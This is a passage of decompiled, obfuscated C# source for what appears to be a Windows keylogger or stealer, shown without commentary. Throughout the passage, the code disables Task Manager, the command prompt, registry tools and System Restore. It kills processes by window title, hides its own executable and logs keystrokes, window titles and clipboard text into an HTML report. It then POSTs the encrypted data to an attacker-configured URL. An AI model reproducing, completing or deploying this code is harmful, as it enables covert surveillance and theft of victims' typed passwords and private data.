					Interaction.Shell(<Module>.smethod_strings_decryptor(307696 -> "REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoControlPanel /t REG_DWORD /d 1 /f")), AppWinStyle.NormalFocus, false, -1);
					num2 = (num * 2294485857u ^ 3132038953u);
					continue;
				case 13u:
					goto IL_2FA;
				case 14u:
					hj.hk.Registry.SetValue(<Module>.smethod_strings_decryptor(307672 -> "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System")), <Module>.smethod_strings_decryptor(307744 -> "DisableRegistryTools")), "1", RegistryValueKind.String);
					num2 = (num * 3529155697u ^ 2850626777u);
					continue;
				case 15u:
					Interaction.Shell(<Module>.smethod_strings_decryptor(307984 -> "REG add HKCU\Software\Policies\Microsoft\Windows\System /v DisableCMD /t REG_DWORD /d 1 /f")), AppWinStyle.NormalFocus, false, -1);
					hj.hk.Registry.SetValue(<Module>.smethod_strings_decryptor(307576 -> "HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\System")), <Module>.smethod_strings_decryptor(307648 -> "DisableCMD")), "1", RegistryValueKind.DWord);
					num2 = (num * 2719076979u ^ 2762917648u);
					continue;
				case 16u:
				{
					RegistryKey registryKey;
					registryKey.Close();
					num2 = (num * 1509879707u ^ 752441245u);
					continue;
				}
				case 17u:
					hj.hk.Registry.SetValue(<Module>.smethod_strings_decryptor(307336 -> "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore")), <Module>.smethod_strings_decryptor(307280 -> "DisableSR")), "1", RegistryValueKind.DWord);
					num2 = (num * 3923398663u ^ 2904070357u);
					continue;
				case 18u:
					goto IL_37;
				case 19u:
					Interaction.Shell(<Module>.smethod_strings_decryptor(308040 -> "REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f")), AppWinStyle.NormalFocus, false, -1);
					num2 = (num * 1134015003u ^ 2357236948u);
					continue;
				}
				break;
			}
			goto IL_319;
			IL_0F:
			if (afg.cem)
			{
				num2 = 4027656550u;
				goto IL_28B;
			}
			IL_19:
			if (afg.cep)
			{
				num2 = 2666236724u;
				goto IL_28B;
			}
			IL_23:
			if (afg.cen)
			{
				num2 = 2422640882u;
				goto IL_28B;
			}
			IL_2D:
			if (afg.ceo)
			{
				num2 = 3060820369u;
				goto IL_28B;
			}
			IL_37:
			if (afg.ces)
			{
				num2 = 4202852827u;
				goto IL_28B;
			}
			IL_41:
			if (afg.cer)
			{
				num2 = 2555054926u;
				goto IL_28B;
			}
			goto IL_319;
			IL_263:
			num2 = 4235523808u;
			goto IL_28B;
			IL_2FA:
			if (afg.cel)
			{
				num2 = 3861114851u;
				goto IL_28B;
			}
			goto IL_0F;
			IL_310:
			if (afg.cek)
			{
				num2 = 3453309771u;
				goto IL_28B;
			}
			goto IL_2FA;
			IL_319:;
		}
		catch (Exception ex)
		{
		}
	}

	// Token: 0x0600006B RID: 107
	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int GetModuleFileNameA(int bjp, [MarshalAs(UnmanagedType.VBByRefStr)] ref string bjr, int bjs);

	// Token: 0x0600006C RID: 108
	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int MoveFileExW([MarshalAs(UnmanagedType.LPTStr)] [In] string bju, [MarshalAs(UnmanagedType.LPTStr)] [In] string bjv, long bjy);

	// Token: 0x0600006D RID: 109 RVA: 0x0001EA70 File Offset: 0x0001CC70
	public static void bjx()
	{
		try
		{
			string executablePath = Application.ExecutablePath;
			int bjp = 0;
			string executablePath2 = Application.ExecutablePath;
			afg.MoveFileExW(afg.bkl(executablePath, afg.GetModuleFileNameA(bjp, ref executablePath2, 256)), Path.GetTempPath() + <Module>.smethod_strings_decryptor(307480 -> "\tmpG")) + DateTime.Now.Millisecond.ToString() + <Module>.smethod_strings_decryptor(307040 -> ".tmp")), 8L);
		}
		catch (Exception ex)
		{
		}
	}

	// Token: 0x0600006E RID: 110 RVA: 0x0001EAFC File Offset: 0x0001CCFC
	public static string bkl(string bkm, int bkn)
	{
		if (bkn < 0)
		{
			goto IL_38;
		}
		goto IL_75;
		uint num2;
		for (;;)
		{
			IL_3D:
			uint num;
			switch ((num = (num2 ^ 3247814299u)) % 8u)
			{
			case 0u:
				goto IL_38;
			case 2u:
				goto IL_75;
			case 3u:
				goto IL_7B;
			case 4u:
				goto IL_A6;
			case 5u:
				goto IL_28;
			case 6u:
				if (bkm.Length == 0)
				{
					num2 = (num * 3331780920u ^ 1146251039u);
					continue;
				}
				goto IL_28;
			case 7u:
				return bkm;
			}
			break;
			IL_28:
			if (bkm.Length > bkn)
			{
				break;
			}
			num2 = 2998572868u;
		}
		goto IL_9B;
		IL_7B:
		throw new ArgumentOutOfRangeException(<Module>.smethod_strings_decryptor(307144 -> "length")), bkn, <Module>.smethod_strings_decryptor(307088 -> "length must be > 0")));
		IL_9B:
		return bkm.Substring(0, bkn);
		IL_38:
		num2 = 2572049152u;
		goto IL_3D;
		IL_75:
		if (bkn != 0)
		{
			num2 = 2222279757u;
			goto IL_3D;
		}
		IL_A6:
		return "";
	}

	// Token: 0x0600006F RID: 111 RVA: 0x0001EBB4 File Offset: 0x0001CDB4
	public static bool bkp(string bkr)
	{
		Process[] processes = Process.GetProcesses();
		int num = 0;
		for (;;)
		{
			IL_7F:
			uint num2 = 3484431380u;
			for (;;)
			{
				uint num3;
				switch ((num3 = (num2 ^ 4264554815u)) % 7u)
				{
				case 0u:
					goto IL_22;
				case 1u:
					num2 = (num3 * 18122584u ^ 957004693u);
					continue;
				case 3u:
					if (num >= processes.Length)
					{
						num2 = 2902364264u;
						continue;
					}
					goto IL_22;
				case 4u:
					goto IL_7F;
				case 5u:
					return true;
				case 6u:
					goto IL_0A;
				}
				return false;
				IL_0A:
				checked
				{
					num++;
					num2 = 3679176797u;
					continue;
					IL_22:
					Process process = processes[num];
					if (!process.ProcessName.StartsWith(bkr))
					{
						goto IL_0A;
					}
					num2 = 2202000060u;
				}
			}
		}
		return false;
	}

	// Token: 0x06000070 RID: 112 RVA: 0x0001EC4C File Offset: 0x0001CE4C
	public static void bky()
	{
		System.Timers.Timer timer = new System.Timers.Timer();
		timer.Elapsed += afg.bkw;
		timer.Enabled = true;
		timer.Interval = 1000.0;
		timer.Start();
	}

	// Token: 0x06000071 RID: 113 RVA: 0x0001EC90 File Offset: 0x0001CE90
	public static void bkw(object sender, ElapsedEventArgs e)
	{
		string[] array = new string[]
		{
			<Module>.smethod_strings_decryptor(307192 -> "%filter_list%"))
		};
		for (;;)
		{
			IL_16:
			uint num = 1008027124u;
			for (;;)
			{
				uint num2;
				Process[] array2;
				int num3;
				Process process;
				string[] array3;
				switch ((num2 = (num ^ 188444507u)) % 6u)
				{
				case 0u:
					goto IL_17D;
				case 1u:
					IL_13A:
					process = array2[num3];
					num = 416107u;
					continue;
				case 2u:
					if (array3.Length != 0)
					{
						num = (num2 * 1195825856u ^ 2531243823u);
						continue;
					}
					return;
				case 3u:
					array3 = array;
					num = (num2 * 3348175259u ^ 1013547146u);
					continue;
				case 4u:
				{
					Process[] processes = Process.GetProcesses();
					array2 = processes;
					num3 = 0;
					goto IL_5A;
				}
				case 5u:
					goto IL_16;
				default:
					goto IL_17D;
				}
				uint num4;
				for (;;)
				{
					IL_6A:
					switch ((num2 = (num4 ^ 188444507u)) % 5u)
					{
					case 0u:
						goto IL_115;
					case 1u:
						goto IL_5A;
					case 3u:
						checked
						{
							num3++;
						}
						num4 = (num2 * 4212248881u ^ 238548558u);
						continue;
					case 4u:
						goto IL_99;
					}
					return;
				}
				IL_5A:
				if (num3 >= array2.Length)
				{
					num4 = 696441088u;
					goto IL_6A;
				}
				goto IL_13A;
				IL_115:
				num4 = 998758617u;
				goto IL_6A;
				IL_99:
				int num5;
				int num6;
				if (num5 > num6)
				{
					num4 = 15522960u;
					goto IL_6A;
				}
				try
				{
					if (process.MainWindowTitle.ToLower().Contains(array3[num5].ToLower()))
					{
						for (;;)
						{
							IL_FB:
							uint num7 = 1633025872u;
							for (;;)
							{
								switch ((num2 = (num7 ^ 188444507u)) % 3u)
								{
								case 0u:
									goto IL_FB;
								case 2u:
									process.Kill();
									num7 = (num2 * 831787506u ^ 340024714u);
									continue;
								}
								goto Block_8;
							}
						}
						Block_8:;
					}
					goto IL_18B;
				}
				catch (Exception ex)
				{
					goto IL_18B;
				}
				goto IL_115;
				IL_18B:
				checked
				{
					num5++;
					goto IL_115;
					IL_17D:
					int num8 = 0;
					num6 = array3.Length - 1;
					num5 = num8;
					goto IL_99;
				}
			}
		}
	}

	// Token: 0x06000072 RID: 114 RVA: 0x0001EE40 File Offset: 0x0001D040
	public static string bly(string blx)
	{
		try
		{
			afg.hr hr = new afg.hr(<Module>.smethod_strings_decryptor(307264 -> "%urlkey%")));
			blx = "p=" + hr.hs(blx);
			HttpWebRequest httpWebRequest;
			byte[] bytes;
			for (;;)
			{
				IL_16F:
				uint num = 336472372u;
				for (;;)
				{
					uint num2;
					switch ((num2 = (num ^ 1642719275u)) % 8u)
					{
					case 0u:
						httpWebRequest.ContentLength = (long)bytes.Length;
						num = (num2 * 2591902185u ^ 2936845359u);
						continue;
					case 1u:
						httpWebRequest.UserAgent = <Module>.smethod_strings_decryptor(306800 -> "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)"));
						httpWebRequest.Method = <Module>.smethod_strings_decryptor(306776 -> "POST"));
						num = (num2 * 2883960722u ^ 839974759u);
						continue;
					case 3u:
						httpWebRequest.Timeout = 10000;
						httpWebRequest.AllowAutoRedirect = true;
						httpWebRequest.MaximumAutomaticRedirections = 50;
						num = (num2 * 2548658344u ^ 3130315178u);
						continue;
					case 4u:
						num = (num2 * 3385942397u ^ 1275992557u);
						continue;
					case 5u:
						goto IL_16F;
					case 6u:
						blx = blx.Replace("+", "%2B");
						bytes = Encoding.UTF8.GetBytes(blx);
						httpWebRequest.ContentType = <Module>.smethod_strings_decryptor(306848 -> "application/x-www-form-urlencoded"));
						num = (num2 * 2799402323u ^ 3068515753u);
						continue;
					case 7u:
					{
						string requestUriString = <Module>.smethod_strings_decryptor(307240 -> "%PostURL%"));
						httpWebRequest = (HttpWebRequest)WebRequest.Create(requestUriString);
						httpWebRequest.Credentials = CredentialCache.DefaultCredentials;
						httpWebRequest.KeepAlive = true;
						num = (num2 * 4241358513u ^ 4160136735u);
						continue;
					}
					}
					goto Block_2;
				}
			}
			Block_2:
			Stream requestStream = httpWebRequest.GetRequestStream();
			try
			{
				requestStream.Write(bytes, 0, bytes.Length);
				WebResponse response = httpWebRequest.GetResponse();
				try
				{
					Stream responseStream = response.GetResponseStream();
					try
					{
						StreamReader streamReader = new StreamReader(responseStream);
						try
						{
							streamReader.ReadToEnd();
							streamReader.Close();
						}
						finally
						{
							if (streamReader != null)
							{
								for (;;)
								{
									IL_1F6:
									uint num3 = 1300909749u;
									for (;;)
									{
										uint num2;
										switch ((num2 = (num3 ^ 1642719275u)) % 3u)
										{
										case 0u:
											goto IL_1F6;
										case 2u:
											((IDisposable)streamReader).Dispose();
											num3 = (num2 * 2336911982u ^ 716613491u);
											continue;
										}
										goto Block_13;
									}
								}
								Block_13:;
							}
						}
						responseStream.Flush();
						responseStream.Close();
					}
					finally
					{
						if (responseStream != null)
						{
							for (;;)
							{
								IL_24F:
								uint num4 = 1435492797u;
								for (;;)
								{
									uint num2;
									switch ((num2 = (num4 ^ 1642719275u)) % 3u)
									{
									case 1u:
										((IDisposable)responseStream).Dispose();
										num4 = (num2 * 952118147u ^ 3302435600u);
										continue;
									case 2u:
										goto IL_24F;
									}
									goto Block_16;
								}
							}
							Block_16:;
						}
					}
					response.Close();
				}
				finally
				{
					if (response != null)
					{
						for (;;)
						{
							IL_2A1:
							uint num5 = 1023575817u;
							for (;;)
							{
								uint num2;
								switch ((num2 = (num5 ^ 1642719275u)) % 3u)
								{
								case 1u:
									((IDisposable)response).Dispose();
									num5 = (num2 * 3627992319u ^ 1639244435u);
									continue;
								case 2u:
									goto IL_2A1;
								}
								goto Block_19;
							}
						}
						Block_19:;
					}
				}
				requestStream.Flush();
				requestStream.Close();
			}
			finally
			{
				if (requestStream != null)
				{
					for (;;)
					{
						IL_2FA:
						uint num6 = 792168973u;
						for (;;)
						{
							uint num2;
							switch ((num2 = (num6 ^ 1642719275u)) % 3u)
							{
							case 1u:
								((IDisposable)requestStream).Dispose();
								num6 = (num2 * 2658993883u ^ 1684092847u);
								continue;
							case 2u:
								goto IL_2FA;
							}
							goto Block_22;
						}
					}
					Block_22:;
				}
			}
		}
		catch (Exception ex)
		{
		}
		string result;
		return result;
	}

	// Token: 0x06000073 RID: 115 RVA: 0x0001F1DC File Offset: 0x0001D3DC
	private static string bmy()
	{
		string result;
		try
		{
			string text = new WebClient().DownloadString(<Module>.smethod_strings_decryptor(306952 -> "http://checkip.dyndns.org/")));
			for (;;)
			{
				IL_6E:
				uint num = 2359674555u;
				for (;;)
				{
					uint num2;
					switch ((num2 = (num ^ 2519191104u)) % 3u)
					{
					case 0u:
						goto IL_6E;
					case 1u:
						text = new Regex(<Module>.smethod_strings_decryptor(306896 -> "\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}"))).Matches(text)[0].ToString();
						result = text;
						num = (num2 * 2459883737u ^ 1596297263u);
						continue;
					}
					goto Block_2;
				}
			}
			Block_2:;
		}
		catch (Exception ex)
		{
			for (;;)
			{
				IL_BB:
				uint num3 = 3085327907u;
				for (;;)
				{
					uint num2;
					switch ((num2 = (num3 ^ 2519191104u)) % 3u)
					{
					case 1u:
						result = null;
						num3 = (num2 * 38450584u ^ 2916433719u);
						continue;
					case 2u:
						goto IL_BB;
					}
					goto Block_4;
				}
			}
			Block_4:;
		}
		return result;
	}

	// Token: 0x17000006 RID: 6
	// (get) Token: 0x06000074 RID: 116 RVA: 0x0001F2C0 File Offset: 0x0001D4C0
	// (set) Token: 0x06000075 RID: 117 RVA: 0x0001F2D4 File Offset: 0x0001D4D4
	private static afg.ux cgl
	{
		get
		{
			return afg.cfs;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (afg.cfs != null)
			{
				goto IL_95;
			}
			goto IL_C6;
			uint num2;
			for (;;)
			{
				IL_9A:
				uint num;
				switch ((num = (num2 ^ 2653544781u)) % 5u)
				{
				case 0u:
					goto IL_95;
				case 1u:
					afg.cfs.ack += afg.bnp;
					afg.cfs.acg += afg.bmq;
					num2 = (num * 2426327264u ^ 2471967054u);
					continue;
				case 2u:
					afg.cfs.ack -= afg.bnp;
					afg.cfs.acg -= afg.bmq;
					num2 = (num * 877981666u ^ 1810580473u);
					continue;
				case 4u:
					goto IL_C6;
				}
				break;
			}
			return;
			IL_95:
			num2 = 3098033984u;
			goto IL_9A;
			IL_C6:
			afg.cfs = value;
			if (afg.cfs != null)
			{
				num2 = 2190652228u;
				goto IL_9A;
			}
		}
	}

	// Token: 0x06000076 RID: 118 RVA: 0x0001F3B8 File Offset: 0x0001D5B8
	private static void bmq(object bmz, ref afg.ux.tz bno)
	{
		if (bno.Button == MouseButtons.Right)
		{
			for (;;)
			{
				IL_4A:
				uint num = 3498393264u;
				for (;;)
				{
					uint num2;
					switch ((num2 = (num ^ 2627246649u)) % 3u)
					{
					case 1u:
						bno.uy = true;
						num = (num2 * 1005496358u ^ 4240269018u);
						continue;
					case 2u:
						goto IL_4A;
					}
					goto Block_2;
				}
			}
			Block_2:;
		}
	}

	// Token: 0x06000077 RID: 119 RVA: 0x0001F418 File Offset: 0x0001D618
	private static void bnp(object bnr, ref afg.ux.tz bns)
	{
	}

	// Token: 0x17000007 RID: 7
	// (get) Token: 0x06000078 RID: 120 RVA: 0x0001F428 File Offset: 0x0001D628
	// (set) Token: 0x06000079 RID: 121 RVA: 0x0001F43C File Offset: 0x0001D63C
	private static afg.acm cgm
	{
		get
		{
			return afg.cft;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (afg.cft != null)
			{
				goto IL_34;
			}
			goto IL_AA;
			uint num2;
			for (;;)
			{
				IL_7A:
				uint num;
				switch ((num = (num2 ^ 106805277u)) % 6u)
				{
				case 1u:
					afg.cft.adf -= afg.bnt;
					num2 = (num * 260206740u ^ 3819879347u);
					continue;
				case 2u:
					goto IL_AA;
				case 3u:
					if (afg.cft != null)
					{
						num2 = (num * 36946277u ^ 3167282559u);
						continue;
					}
					break;
				case 4u:
					goto IL_34;
				case 5u:
					afg.cft.adf += afg.bnt;
					num2 = (num * 440454620u ^ 1598370243u);
					continue;
				}
				break;
			}
			return;
			IL_34:
			num2 = 1794122532u;
			goto IL_7A;
			IL_AA:
			afg.cft = value;
			num2 = 1393052842u;
			goto IL_7A;
		}
	}

	// Token: 0x0600007A RID: 122 RVA: 0x0001F500 File Offset: 0x0001D700
	private static void bnt(afg.acm bnu)
	{
		string text = hj.hk.Clipboard.GetText();
		text = text.Replace("&", <Module>.smethod_strings_decryptor(307000 -> "&amp;")));
		text = text.Replace("<", <Module>.smethod_strings_decryptor(306560 -> "&lt;")));
		for (;;)
		{
			IL_100:
			uint num = 3483170010u;
			for (;;)
			{
				uint num2;
				switch ((num2 = (num ^ 3849118495u)) % 5u)
				{
				case 0u:
					goto IL_100;
				case 1u:
					if (Operators.CompareString(text, "", false) != 0)
					{
						num = (num2 * 2756969855u ^ 3521976057u);
						continue;
					}
					break;
				case 2u:
					text = text.Replace(">", <Module>.smethod_strings_decryptor(306536 -> "&gt;")));
					text = text.Replace("\"", <Module>.smethod_strings_decryptor(306608 -> "&quot;")));
					num = (num2 * 2907869597u ^ 3297075197u);
					continue;
				case 4u:
					afg.cdv = afg.cdv + <Module>.smethod_strings_decryptor(306584 -> "<br><span style=font-style:normal;text-decoration:none;text-transform:none;color:#FF0000;><strong>[clipboard]</strong></span>")) + text + <Module>.smethod_strings_decryptor(306656 -> "<span style=font-style:normal;text-decoration:none;text-transform:none;color:#FF0000;><strong>[clipboard]</strong></span><br>"));
					num = (num2 * 2749935857u ^ 526315858u);
					continue;
				}
				return;
			}
		}
	}

	// Token: 0x17000008 RID: 8
	// (get) Token: 0x0600007B RID: 123 RVA: 0x0001F614 File Offset: 0x0001D814
	// (set) Token: 0x0600007C RID: 124 RVA: 0x0001F628 File Offset: 0x0001D828
	private static afg.adm cgn
	{
		get
		{
			return afg.cfu;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (afg.cfu != null)
			{
				goto IL_36;
			}
			goto IL_8A;
			uint num2;
			for (;;)
			{
				IL_5E:
				uint num;
				switch ((num = (num2 ^ 3551710800u)) % 5u)
				{
				case 1u:
					afg.adm.aeq -= afg.bwz;
					num2 = (num * 452357439u ^ 3002273149u);
					continue;
				case 2u:
					goto IL_36;
				case 3u:
					afg.adm.aeq += afg.bwz;
					num2 = (num * 4160046623u ^ 1480139188u);
					continue;
				case 4u:
					goto IL_8A;
				}
				break;
			}
			return;
			IL_36:
			num2 = 2592689062u;
			goto IL_5E;
			IL_8A:
			afg.cfu = value;
			if (afg.cfu != null)
			{
				num2 = 2312954560u;
				goto IL_5E;
			}
		}
	}

	// Token: 0x0600007D RID: 125
	[DllImport("user32.dll")]
	private static extern IntPtr GetForegroundWindow();

	// Token: 0x0600007E RID: 126
	[DllImport("user32.dll")]
	private static extern int GetWindowText(IntPtr bnw, StringBuilder bnq, int bnz);

	// Token: 0x0600007F RID: 127
	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern int GetWindowTextLength(IntPtr bor);

	// Token: 0x06000080 RID: 128
	[DllImport("user32.dll")]
	private static extern bool GetKeyboardState(byte[] bot);

	// Token: 0x06000081 RID: 129
	[DllImport("user32.dll")]
	private static extern uint MapVirtualKey(uint bov, uint boy);

	// Token: 0x06000082 RID: 130
	[DllImport("psapi.dll")]
	public static extern bool EnumProcessModules(IntPtr bow, [MarshalAs(UnmanagedType.LPArray, ArraySubType = UnmanagedType.U4)] [In] [Out] uint[] boq, uint boz, [MarshalAs(UnmanagedType.U4)] ref uint bpr);

	// Token: 0x06000083 RID: 131
	[DllImport("psapi.dll")]
	public static extern uint GetModuleFileNameEx(IntPtr bpt, IntPtr bpu, [Out] StringBuilder bpv, [MarshalAs(UnmanagedType.U4)] [In] int bpy);

	// Token: 0x06000084 RID: 132
	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int GetWindowThreadProcessId(IntPtr bpw, ref int bpq);

	// Token: 0x06000085 RID: 133
	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int GetKeyboardLayout(int brs);

	// Token: 0x06000086 RID: 134
	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int ToUnicodeEx(uint bru, uint brv, byte[] bry, [MarshalAs(UnmanagedType.LPWStr)] [Out] StringBuilder brx, int brw, uint brq, IntPtr brz);

	// Token: 0x06000087 RID: 135 RVA: 0x0001F6D0 File Offset: 0x0001D8D0
	private static string bst(int bsu)
	{
		try
		{
			return Process.GetProcessById(bsu).MainModule.FileName;
		}
		catch (Exception ex)
		{
			Process processById;
			uint[] array;
			int num4;
			for (;;)
			{
				IL_137:
				uint num = 487486017u;
				for (;;)
				{
					uint num2;
					switch ((num2 = (num ^ 947574329u)) % 9u)
					{
					case 0u:
						goto IL_137;
					case 1u:
						goto IL_141;
					case 2u:
					{
						uint boz;
						uint num3;
						afg.EnumProcessModules(processById.Handle, array, boz, ref num3);
						num = (num2 * 1478810318u ^ 1364422016u);
						continue;
					}
					case 3u:
					{
						int num5;
						if (num4 > num5)
						{
							num = 1504432136u;
							continue;
						}
						goto IL_141;
					}
					case 5u:
					{
						processById = Process.GetProcessById(bsu);
						array = new uint[1024];
						uint boz = checked((uint)(Marshal.SizeOf(typeof(IntPtr)) * array.Length));
						num = (num2 * 3347334764u ^ 2182359498u);
						continue;
					}
					case 6u:
					{
						uint num3 = 0u;
						num = (num2 * 2631753251u ^ 796095699u);
						continue;
					}
					case 7u:
					{
						int num6 = 0;
						int num7;
						int num5 = num7;
						num4 = num6;
						num = (num2 * 4233681292u ^ 1239382578u);
						continue;
					}
					case 8u:
					{
						uint num3;
						int num7 = checked((int)Math.Round(num3 / (double)Marshal.SizeOf(typeof(IntPtr))));
						num = (num2 * 2960044351u ^ 2999645177u);
						continue;
					}
					}
					goto Block_3;
				}
			}
			Block_3:
			goto IL_17C;
			IL_141:
			StringBuilder stringBuilder = new StringBuilder(1024);
			afg.GetModuleFileNameEx(processById.Handle, (IntPtr)((long)((ulong)array[num4])), stringBuilder, stringBuilder.Capacity);
			return stringBuilder.ToString();
			IL_17C:;
		}
		return null;
	}

	// Token: 0x06000088 RID: 136 RVA: 0x0001F880 File Offset: 0x0001DA80
	private static string btw()
	{
		string result = "";
		try
		{
			string processName = Process.GetProcessById(afg.cfx).ProcessName;
			string productName = FileVersionInfo.GetVersionInfo(afg.bst(afg.cfx)).ProductName;
			if (productName != null | Operators.CompareString(productName, "", false) != 0)
			{
				goto IL_50;
			}
			goto IL_C1;
			uint num2;
			for (;;)
			{
				IL_91:
				uint num;
				switch ((num = (num2 ^ 1459237129u)) % 6u)
				{
				case 0u:
					result = processName + ": ";
					num2 = (num * 144508518u ^ 274943130u);
					continue;
				case 1u:
					result = productName + ": ";
					num2 = (num * 3712543720u ^ 3019443696u);
					continue;
				case 2u:
					goto IL_C1;
				case 4u:
					goto IL_50;
				}
				break;
			}
			return result;
			IL_50:
			num2 = 1985836156u;
			goto IL_91;
			IL_C1:
			if (processName != null | Operators.CompareString(processName, "", false) != 0)
			{
				num2 = 732247055u;
				goto IL_91;
			}
		}
		catch (Exception ex)
		{
		}
		return result;
	}

	// Token: 0x06000089 RID: 137 RVA: 0x0001F994 File Offset: 0x0001DB94
	private static string buw()
	{
		afg.cfy = afg.GetForegroundWindow();
		StringBuilder stringBuilder;
		for (;;)
		{
			IL_90:
			uint num = 4276972571u;
			for (;;)
			{
				uint num2;
				switch ((num2 = (num ^ 3333266141u)) % 5u)
				{
				case 0u:
				{
					int num3;
					stringBuilder = new StringBuilder(num3);
					if (afg.GetWindowText(afg.cfy, stringBuilder, num3) > 0)
					{
						num = (num2 * 4258950486u ^ 3408156650u);
						continue;
					}
					break;
				}
				case 2u:
					goto IL_90;
				case 3u:
					goto IL_99;
				case 4u:
				{
					afg.GetWindowThreadProcessId(afg.cfy, ref afg.cfx);
					int num3 = checked(afg.GetWindowTextLength(afg.cfy) + 1);
					num = (num2 * 744546932u ^ 3749680948u);
					continue;
				}
				}
				goto Block_2;
			}
		}
		Block_2:
		return null;
		IL_99:
		return stringBuilder.ToString();
	}

	// Token: 0x0600008A RID: 138 RVA: 0x0001FA40 File Offset: 0x0001DC40
	private static void bvx()
	{
		if (Operators.CompareString(afg.cgh, afg.cfv, false) != 0)
		{
			for (;;)
			{
				IL_109:
				uint num = 3502521803u;
				for (;;)
				{
					uint num2;
					switch ((num2 = (num ^ 2248172039u)) % 5u)
					{
					case 1u:
					{
						string[] array = new string[7];
						num = (num2 * 1964800498u ^ 1724502168u);
						continue;
					}
					case 2u:
					{
						string[] array;
						array[0] = <Module>.smethod_strings_decryptor(306760 -> "<br><span style=font-size:14px;font-style:normal;text-decoration:none;text-transform:none;color:#0099cc;><b>["));
						num = (num2 * 1258506266u ^ 2870294007u);
						continue;
					}
					case 3u:
					{
						string[] array;
						array[1] = afg.btw();
						array[2] = <Module>.smethod_strings_decryptor(306704 -> "</b>"));
						array[3] = afg.cfv;
						array[4] = <Module>.smethod_strings_decryptor(306296 -> "<b>]</b> <span style=font-style:normal;text-decoration:none;text-transform:none;color:#000000;>("));
						array[5] = DateTime.Now.ToString(<Module>.smethod_strings_decryptor(306368 -> "MM/dd/yyyy HH:mm:ss")));
						array[6] = <Module>.smethod_strings_decryptor(306344 -> ")</span></span><br>"));
						afg.cgk = string.Concat(array);
						afg.cdv += afg.cgk;
						afg.cgh = afg.cfv;
						num = (num2 * 4045417483u ^ 1036652008u);
						continue;
					}
					case 4u:
						goto IL_109;
					}
					goto Block_2;
				}
			}
			Block_2:;
		}
	}

	// Token: 0x0600008B RID: 139 RVA: 0x0001FB60 File Offset: 0x0001DD60
	private static bool bvz()
	{
		int num = 0;
		checked
		{
			int num2 = afg.cfz.Length - 1;
			int num3 = num;
			for (;;)
			{
				IL_71:
				if (num3 <= num2)
				{
					goto IL_50;
				}
				int num4 = 2057080282;
				for (;;)
				{
					IL_1E:
					switch ((num4 ^ 226912584) % 6)
					{
					case 1:
						goto IL_50;
					case 2:
						num4 = 91607571;
						continue;
					case 3:
						goto IL_0E;
					case 4:
						return true;
					case 5:
						goto IL_71;
					}
					return false;
				}
				IL_0E:
				num3++;
				num4 = 1912259281;
				goto IL_1E;
				IL_50:
				if (afg.cfv.ToLower().Contains(afg.cfz[num3]))
				{
					num4 = 245022646;
					goto IL_1E;
				}
				goto IL_0E;
			}
			return false;
		}
	}

	// Token: 0x0600008C RID: 140 RVA: 0x0001FBE8 File Offset: 0x0001DDE8
	private static bool byz()
	{
		string processName = Process.GetProcessById(afg.cfx).ProcessName;
		int num = 0;
		checked
		{
			int num2 = afg.cfz.Length - 1;
			int num3 = num;
			for (;;)
			{
				IL_97:
				uint num4 = 920393170u;
				for (;;)
				{
					uint num5;
					switch ((num5 = (num4 ^ 752149711u)) % 7u)
					{
					case 0u:
						if (num3 > num2)
						{
							num4 = 1425346167u;
							continue;
						}
						goto IL_3B;
					case 1u:
						return true;
					case 2u:
						goto IL_3B;
					case 3u:
						goto IL_30;
					case 5u:
						goto IL_97;
					case 6u:
						num4 = (unchecked(num5 * 3047673054u) ^ 2132490971u);
						continue;
					}
					goto Block_3;
					IL_30:
					num3++;
					num4 = 30673405u;
					continue;
					IL_3B:
					if (Operators.CompareString(processName.ToLower(), afg.cfz[num3], false) != 0)
					{
						goto IL_30;
					}
					num4 = 994511148u;
				}
			}
			Block_3:
			return false;
		}
	}

	// Token: 0x0600008D RID: 141 RVA: 0x0001FC98 File Offset: 0x0001DE98
	private static void bwz(Keys bqz)
	{
		try
		{
			afg.cfv = afg.buw();
			if (afg.cfq)
			{
				goto IL_706;
			}
			goto IL_C08;
			uint num2;
			for (;;)
			{
				IL_A11:
				uint num;
				switch ((num = (num2 ^ 3320050161u)) % 119u)
				{
				case 0u:
				{
					string left = afg.cdv.Substring(checked(afg.cdv.Length - 7));
					num2 = (num * 1887641878u ^ 1368099216u);
					continue;
				}
				case 1u:
					if (afg.cfw == 1)
					{
						num2 = (num * 1378606010u ^ 664054226u);
						continue;
					}
					goto IL_632;
				case 2u:
					afg.cdv += <Module>.smethod_strings_decryptor(305760 -> "<font color=#008000>&uarr;</font>"));
					num2 = (num * 1745706711u ^ 1454291031u);
					continue;
				case 3u:
					afg.cdv += <Module>.smethod_strings_decryptor(305720 -> "<font color=#008000>{ENTER}</font>"));
					afg.cdv += <Module>.smethod_strings_decryptor(305280 -> "<br>"));
					num2 = (num * 3076081829u ^ 1626728386u);
					continue;
				case 4u:
					goto IL_C17;
				case 5u:
					goto IL_3B5;
				case 6u:
					afg.cdv += <Module>.smethod_strings_decryptor(321208 -> "&amp;"));
					num2 = (num * 3185877586u ^ 490952619u);
					continue;
				case 8u:
					goto IL_3D3;
				case 9u:
					goto IL_3E2;
				case 10u:
					goto IL_3C4;
				case 11u:
					if (!afg.bvz())
					{
						num2 = (num * 794159110u ^ 3373019393u);
						continue;
					}
					goto IL_C08;
				case 12u:
